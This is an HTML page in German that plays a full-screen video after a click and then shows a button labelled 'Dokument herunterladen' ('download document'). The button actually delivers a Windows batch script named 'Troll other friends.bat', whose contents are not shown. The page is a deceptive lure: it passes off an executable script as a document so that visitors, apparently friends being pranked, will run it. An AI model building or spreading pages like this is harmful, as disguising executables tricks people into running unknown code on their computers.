```html
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            width: 100%;
            height: 100%;
            background: black;
            overflow: hidden;
        }

        #startScreen {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: Arial, sans-serif;
            font-size: 24px;
            cursor: pointer;
        }

        #video {
            display: none;
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        #download {
            display: none;
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 12px 18px;
            background: white;
            color: black;
            text-decoration: none;
            font-family: Arial, sans-serif;
            border-radius: 8px;
            z-index: 10;
        }

        #download:hover {
            background: #ddd;
        }
    </style>
</head>

<body>

    <div id="startScreen">
        KLICKEN ZUM STARTEN
    </div>

    <video id="video" playsinline>
        <source src="video.mp4" type="video/mp4">
    </video>

    <a id="download" href="Troll%20other%20friends.bat" download>
        Dokument herunterladen
    </a>

    <script>
        const startScreen = document.getElementById("startScreen");
        const video = document.getElementById("video");
        const download = document.getElementById("download");

        startScreen.addEventListener("click", async () => {
            startScreen.style.display = "none";
            video.style.display = "block";
            download.style.display = "block";

            video.volume = 1.0;

            try {
                await video.play();
            } catch (error) {
                console.log(error);
            }
        });
    </script>

</body>
</html>
